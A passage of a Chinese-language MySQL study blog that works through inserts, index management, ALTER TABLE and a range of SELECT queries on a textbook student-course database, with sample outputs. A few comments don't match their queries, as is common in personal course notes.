class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; INSERT INTO student</span><br><span class=\"line\">    -&gt; (Sno,Sname,Ssex,Sage,Sdept)</span><br><span class=\"line\">    -&gt; VALUES</span><br><span class=\"line\">    -&gt; (&apos;201215124&apos;,&apos;JingYu&apos;,default,27,&apos;MATH&apos;);</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; select * from student where Sno=&apos;201215124&apos;;</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br><span class=\"line\">| Sno       | Sname  | Ssex | Sage | Sdept |</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br><span class=\"line\">| 201215124 | JingYu | male |   27 | MATH  |</span><br><span class=\"line\">+-----------+--------+------+------+-------+</span><br></pre></td></tr></table></figure>\n\n<p>删除数据</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; delete from student where Sno=&apos;s09&apos;;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"索引的建立与删除\"><a href=\"#索引的建立与删除\" class=\"headerlink\" title=\"索引的建立与删除\"></a>索引的建立与删除</h3><p>建立索引是加快查询速度的有效手段。常见索引包括顺序文件上的索引、B+树索引、散列(hash)索引、位图索引等。索引管理一般由管理员完成，用户不必也不能显式地选择索引。索引属于内模式的范畴。</p>\n<h4 id=\"建立索引\"><a href=\"#建立索引\" class=\"headerlink\" title=\"建立索引\"></a>建立索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">CREATE [UNIQUE] [CLUSTER] INDEX &lt;索引名&gt; ON &lt;表名&gt;(&lt;列名&gt; [&lt;次序&gt;]...)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX Stusno ON student(Sno);  //ASC 升序（默认）</span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX Coucno ON course(Cno);</span><br><span class=\"line\">mysql&gt; CREATE UNIQUE INDEX SCno ON SC(Sno ASC,Cno DESC); //DESC 降序</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"删除索引\"><a href=\"#删除索引\" class=\"headerlink\" title=\"删除索引\"></a>删除索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ALTER TABLE table_name DROP INDEX index_name;</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; ALTER TABLE SC DROP INDEX SCno;</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"修改索引\"><a href=\"#修改索引\" class=\"headerlink\" title=\"修改索引\"></a>修改索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">MYSQL 没有提供直接修改索引的命令，一般情况下我们需要先删除原索引，再建立新索引</span><br><span class=\"line\"></span><br><span class=\"line\">ALTER TABLE user</span><br><span class=\"line\">DROP INDEX idx_user_username;</span><br><span class=\"line\">--再以修改后的内容创建同名索引</span><br><span class=\"line\">CREATE INDEX idx_user_username ON user (username(8));</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查看索引\"><a href=\"#查看索引\" class=\"headerlink\" title=\"查看索引\"></a>查看索引</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上FROM db_name</span><br><span class=\"line\">SHOW INDEX FROM table_name [FROM db_name]</span><br><span class=\"line\">--如果查看索引前，没有使用user db_name等命令指定具体的数据库，则必须加上db_name.前缀</span><br><span class=\"line\">SHOW INDEX FROM [db_name.]table_name</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"修改基本表\"><a href=\"#修改基本表\" class=\"headerlink\" title=\"修改基本表\"></a>修改基本表</h3><blockquote>\n<p><strong>2.1</strong> 向基本表Student中增加“入学时间”属性列，其属性名为RegisterDate，数据类型为DATETIME型</p>\n<p><strong>2.2</strong> 将Sage(年龄)的数据类型改为SMALLINT型.</p>\n<p><strong>2.3</strong> 删除属性列RegisterDate.</p>\n</blockquote>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; ALTER TABLE student ADD RegisterDate DATETIME; //新增列</span><br><span class=\"line\">mysql&gt; ALTER TABLE student modify column Sage smallint; //更新数据类型，注意是 modify</span><br><span class=\"line\">mysql&gt; ALTER TABLE student change column RegisterDate RDate time; //同时修改列名和列的数据类型</span><br><span class=\"line\">mysql&gt; desc student;</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">| Field | Type        | Null | Key | Default | Extra |</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">| Sno   | char(12)    | NO   | PRI | NULL    |       |</span><br><span class=\"line\">| Sname | char(20)    | NO   | UNI | NULL    |       |</span><br><span class=\"line\">| Ssex  | char(8)     | YES  |     | male    |       |</span><br><span class=\"line\">| Sage  | smallint(6) | YES  |     | NULL    |       |</span><br><span class=\"line\">| Sdept | char(15)    | YES  |     | NULL    |       |</span><br><span class=\"line\">| RDate | time        | YES  |     | NULL    |       |</span><br><span class=\"line\">+-------+-------------+------+-----+---------+-------+</span><br><span class=\"line\">6 rows in set (0.01 sec)</span><br><span class=\"line\">mysql&gt; ALTER TABLE student drop column RDate; //删除新增的列</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"数据查询\"><a href=\"#数据查询\" class=\"headerlink\" title=\"数据查询\"></a>数据查询</h3><h4 id=\"无条件查询\"><a href=\"#无条件查询\" class=\"headerlink\" title=\"无条件查询\"></a>无条件查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sno,Sdept from student; //查询基本信息</span><br><span class=\"line\">mysql&gt; select Sname,2020-Sage from student; //查询计算之后的信息</span><br><span class=\"line\">mysql&gt; select Sname,&apos;Year of Brith:&apos;,2020-Sage,LOWER(Sdept) from student; //查询全体学生的姓名、出生年份和学号，要求用小写字母表示学号中的字母</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">| Sname   | Year of Brith: | 2020-Sage | LOWER(Sdept) |</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">| LiYong  | Year of Brith: |      2000 | cs           |</span><br><span class=\"line\">| LiuChen | Year of Brith: |      2001 | cs           |</span><br><span class=\"line\">| WangMin | Year of Brith: |      2002 | cs           |</span><br><span class=\"line\">| ZhangLi | Year of Brith: |      2001 | is           |</span><br><span class=\"line\">| JingYu  | Year of Brith: |      1993 | math         |</span><br><span class=\"line\">+---------+----------------+-----------+--------------+</span><br><span class=\"line\">5 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,&apos;Year of Brith:&apos;BIRTH,2020-Sage BIRTHDAY,LOWER(Sdept) DEPARTMENT from student; //给查询结果使用别名</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">| Sname   | BIRTH          | BIRTHDAY | DEPARTMENT |</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">| LiYong  | Year of Brith: |     2000 | cs         |</span><br><span class=\"line\">| LiuChen | Year of Brith: |     2001 | cs         |</span><br><span class=\"line\">| WangMin | Year of Brith: |     2002 | cs         |</span><br><span class=\"line\">| ZhangLi | Year of Brith: |     2001 | is         |</span><br><span class=\"line\">| JingYu  | Year of Brith: |     1993 | math       |</span><br><span class=\"line\">+---------+----------------+----------+------------+</span><br><span class=\"line\">5 rows in set (0.00 sec)</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT DISTINCT SNO FROM SC; //查询有选修课程的学号并去重</span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">| SNO       |                      </span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">| 201215121 |                      </span><br><span class=\"line\">| 201215122 |                      </span><br><span class=\"line\">+-----------+                      </span><br><span class=\"line\">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"条件查询\"><a href=\"#条件查询\" class=\"headerlink\" title=\"条件查询\"></a>条件查询</h4><p><img src=\"C:%5CUsers%5Cbrian%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20200317114810992.png\" alt=\"image-20200317114810992\"></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sno,Sname from student where Sdept=&apos;MATH&apos;; //查询数学系学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sage,Sname from student where Sage BETWEEN 18 AND 22; //查询年龄区间 18-22 的学生信息</span><br><span class=\"line\">mysql&gt; select Sage,Sname from student where Sage NOT BETWEEN 18 AND 22; // 查询年龄范围之外的学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sdept in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;); // 查询目标院系学生信息</span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sdept NOT in(&apos;CS&apos;,&apos;MATH&apos;,&apos;OS&apos;);</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu%&apos;; //查询姓名以 Liu 开头的学生信息。 % 代表任意长度</span><br><span class=\"line\">mysql&gt; select Sname,Sno from student where Sname like &apos;Liu___&apos;; //查询限定长度的姓名信息。_ 代表任意单个字符</span><br></pre></td></tr></table></figure>\n\n<p>如果要查询的字符串本身含有通配符 <code>%</code> 或 <code>_</code> ,这时就要使用 <code>ESCAPE</code> 对其转义处理。</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_Design&apos; ESCAPE &apos;/&apos;;</span><br><span class=\"line\">mysql&gt; SELECT Cno,Credits FROM Course where Cname LIKE &apos;DB/_%i_&apos; ESCAPE &apos;/&apos;; DB开头，倒数第二个为 i 。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT Sno,Cno</span><br><span class=\"line\">    -&gt; FROM SC</span><br><span class=\"line\">    -&gt; WHERE Grade IS NULL;  // 参加考试但没有考试成绩</span><br><span class=\"line\">mysql&gt; SELECT Sno,Cno</span><br><span class=\"line\">    -&gt; FROM SC</span><br><span class=\"line\">    -&gt; WHERE Grade IS NOT NULL; // 所有有成绩的学生信息</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"ORDER-BY-字句\"><a href=\"#ORDER-BY-字句\" class=\"headerlink\" title=\"ORDER BY 字句\"></a>ORDER BY 字句</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sno,Grade FROM SC WHERE Cno=&apos;3&apos; order by Grade desc; // 按成绩降序排列选修 Cno=3 的学生信息</span><br><span class=\"line\">mysql&gt; SELECT * FROM student ORDER BY Sdept,Sage DESC; // 所在系号升序，同一系学生年龄按降序。</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\">| Sno       | Sname   | Ssex   | Sage | Sdept |</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\">| 201215121 | LiYong  | male   |   20 | CS    |</span><br><span class=\"line\">| 201215122 | LiuChen | female |   19 | CS    |</span><br><span class=\"line\">| 201215123 | WangMin | female |   18 | CS    |</span><br><span class=\"line\">| 201215125 | ZhangLi | male   |   19 | IS    |</span><br><span class=\"line\">| 201215124 | JingYu  | male   |   27 | MATH  |</span><br><span class=\"line\">+-----------+---------+--------+------+-------+</span><br><span class=\"line\"></span><br><span class=\"line\">未对查询结果分组，聚集函数将作用于整个查询结果。分组后将作用于每一组。</span><br><span class=\"line\">mysql&gt; select Cno,count(Sno) from sc group by Cno; //求各个课程号(Cno)及相应的选课人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc group by Sno HAVING COUNT(*) &gt;=3;</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">| Sno       |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">| 201215121 |</span><br><span class=\"line\">+-----------+</span><br><span class=\"line\">1 row in set (0.00 sec) //查询选修了3门或3门以上课程的学生学号(Sno)</span><br><span class=\"line\">WHERE 子句作用于基本表或视图，从中选择满足条件的元组，HAVING  短语作用于组，从中选择满足条件的组。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"集函数的使用\"><a href=\"#集函数的使用\" class=\"headerlink\" title=\"集函数的使用\"></a>集函数的使用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL提供许多聚集函数，主要有：</span><br><span class=\"line\">- COUNT(*)                     统计元组个数</span><br><span class=\"line\">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class=\"line\">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class=\"line\">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class=\"line\">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class=\"line\">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class=\"line\">DISTINCT 短语对结果去重，默认 ALL</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">select count(*) from student;  //查询学生总人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"连接查询\"><a href=\"#连接查询\" class=\"headerlink\" title=\"连接查询\"></a>连接查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sname from student,sc where student.Sno=SC.Sno AND cno=&apos;2&apos; and Grade&gt;=90; // 查询选2门课且成绩大于90</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select first.Cno,second.Cpno from course first,course second where first.Cpno=second.Cno; //自身连接 找到选修的选修课</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\">| Cno | Cpno |</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\">| 1   | 7    |</span><br><span class=\"line\">| 3   | 5    |</span><br><span class=\"line\">| 4   |      |</span><br><span class=\"line\">| 5   | 6    |</span><br><span class=\"line\">| 7   |      |</span><br><span class=\"line\">+-----+------+</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; SELECT Sname,Sage </span><br><span class=\"line\">from student,course,sc </span><br><span class=\"line\">where student.Sno=sc.Sno AND sc.Cno=course.Cno </span><br><span class=\"line\">AND Cname=&apos;database&apos;;//三表连接查询，查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sage from student,sc where sc.Sno=student.Sno;  //查询每个学生及其选修课程的情况。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class=\"line\">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"集合查询\"><a href=\"#集合查询\" class=\"headerlink\" title=\"集合查询\"></a>集合查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;CS&apos; union select * from student where Sage&lt;=19; //UNION 联合查询，自动去重 查询计算机科学系的学生或年龄不大于20岁的学生信息。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;CS&apos; or Sage&lt;=&apos;20&apos;; //查询计算机科学系的学生或年龄不大于20岁的学生信息</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Ssex,Sage,Sdept from student where Sdept=&apos;math&apos; and Sage&lt;=&apos;20&apos;; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;math&apos; intersect select * from student where Sage&lt;=19; //查询数学系的学生且年龄不大于20岁的学生的交集，这实际上就是查询数学系中年龄不大于20岁的学生。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select * from student where Sdept=&apos;math&apos; execpt select * from student where Sage&lt;=19;//查询数学系的学生与年龄不大于20岁的学生的差集。</span><br><span class=\"line\"></span><br><span class=\"line\">INTERSECT 交操作 &amp; EXCEPT 差操作，在mysql中还不支持，一般用 not in 代替实现</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"嵌套查询\"><a href=\"#嵌套查询\" class=\"headerlink\" title=\"嵌套查询\"></a>嵌套查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; SELECT Sname,Sage </span><br><span class=\"line\">FROM student </span><br><span class=\"line\">WHERE Sno IN </span><br><span class=\"line\">    (SELECT Sno </span><br><span class=\"line\">    from sc </span><br><span class=\"line\">    WHERE Cno IN </span><br><span class=\"line\">        (SELECT Cno </span><br><span class=\"line\">        from course </span><br><span class=\"line\">        where Cname=&apos;database&apos;</span><br><span class=\"line\">        )</span><br><span class=\"line\">    ); //跨三个表查询，实现的效果与多表连接效果一样。查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br><span class=\"line\">    </span><br><span class=\"line\">mysql&gt; select student.Sno,Sname from student,course,sc where student.Sno=sc.Sno AND sc.Cno=course.Cno AND course.Cname=&apos;math&apos;; //查询选修了课程名为“数据结构”的学生学号(Sno)和姓名(Sname)。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"带-IN-和-ALL-的子查询\"><a href=\"#带-IN-和-ALL-的子查询\" class=\"headerlink\" title=\"带 IN 和 ALL 的子查询\"></a>带 <code>IN</code> 和 <code>ALL</code> 的子查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Sname,Sage from student where Sage &lt;= ANY (select Sage from student where Sdept=&apos;IS&apos;); //查询非自动化系的不超过自动化系所有学生的年龄的学生姓名(Sname)和年龄(Sage)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sname,Sdept from student where Sno in (select Sno from sc where Cno=&apos;2&apos;); //查询选修了编号为“C02”的课程的学生姓名(Sname)和所在系(Sdept)。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno,Sname,Sdept from student where Sdept in (select sdept from student where Sname=&apos;WangMin&apos;);</span><br><span class=\"line\">//查询与“李伟”在同一个系学习的学生学号(Sno)、姓名(Sname)和系名(Sdept)。</span><br><span class=\"line\">此查询为不相关子查询，子查询条件不依赖于父条件。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"基于派生表的查询\"><a href=\"#基于派生表的查询\" class=\"headerlink\" title=\"基于派生表的查询\"></a>基于派生表的查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h3 id=\"sql高级查询\"><a href=\"#sql高级查询\" class=\"headerlink\" title=\"sql高级查询\"></a><code>sql</code>高级查询</h3><h4 id=\"聚集函数的使用\"><a href=\"#聚集函数的使用\" class=\"headerlink\" title=\"聚集函数的使用\"></a>聚集函数的使用</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">SQL提供许多聚集函数，主要有：</span><br><span class=\"line\">- COUNT(*)                     统计元组个数</span><br><span class=\"line\">- COUNT([DISTINCT|ALL] &lt;列名&gt;) 统计一列中值的个数</span><br><span class=\"line\">- SUM([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的总和，列必须是数值型</span><br><span class=\"line\">- AVG([DISTINCT|ALL] &lt;列名&gt;)   计算一列值的平均值，列必须是数值型</span><br><span class=\"line\">- MAX([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最大值</span><br><span class=\"line\">- MIN([DISTINCT|ALL] &lt;列名&gt;)   求一列值中的最小值</span><br><span class=\"line\">DISTINCT 短语对结果去重，默认 ALL</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">select count(*) from student;  //查询学生总人数</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select count(DISTINCT Sdept) from student; //查询有多少个专业</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select AVG(Grade) from sc where Cno=&apos;1&apos;; //计算选修C01号课程的学生平均成绩。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select MAX(Grade) from sc where Cno=&apos;1&apos;; //查询选修C01号课程的学生最高分数。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"查询结果分组\"><a href=\"#查询结果分组\" class=\"headerlink\" title=\"查询结果分组\"></a>查询结果分组</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select Cno,count(Sno) from sc group by Cno;</span><br><span class=\"line\">//求每门课的课程号(Cno)及相应的选课人数。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc having count(Cno)&gt;=3;</span><br><span class=\"line\">//查询选修了3门或3门以上课程的学生学号(Sno)。</span><br><span class=\"line\">这个是不对的，只是结果看起来对</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select Sno from sc group by Sno having count(*)=3; //查询选修了3门或3门以上课程的学生学号(Sno)。</span><br></pre></td></tr></table></figure>\n\n<h4 id=\"不同表之间的连接查询\"><a href=\"#不同表之间的连接查询\" class=\"headerlink\" title=\"不同表之间的连接查询\"></a>不同表之间的连接查询</h4><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mysql&gt; select student.Sname,student.Sdept,course.Cname from student,course,sc where student.Sno=sc.Sno and sc.Cno=course.Cno; //查询每个学生及其选修课程的情况。</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select student.Sno,Sname,Cname,Grade from student,sc,course where student.Sno=sc.Sno AND sc.Cno=course.Cno; </span><br><span class=\"line\">//查询每个学生的学号(Sno)、姓名(Sname)、选修的课程名(Cname)及成绩(Grade)。 这里 Sno 值不唯一，因此要加上前缀</span><br><span class=\"line\"></span><br><span class=\"line\">mysql&gt; select 